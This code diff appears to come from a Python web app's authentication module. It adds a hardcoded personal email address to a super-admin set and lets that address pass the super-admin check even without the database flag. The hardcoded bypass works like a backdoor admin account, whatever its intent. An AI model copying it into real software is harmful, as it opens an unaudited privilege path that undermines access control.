@@ -72,10 +72,13 @@ def get_current_user(
     return user
 
 
+SUPER_ADMIN_EMAILS = {"deepikar412003@gmail.com"}
+
 def require_super_admin(
     current_user: User = Depends(get_current_user),
 ) -> User:
-    if not current_user.is_super_admin:
+    is_super = bool(current_user.is_super_admin) or (current_user.email or "").lower() in SUPER_ADMIN_EMAILS
+    if not is_super:
         raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Super Admin access required.")
     return current_user
 
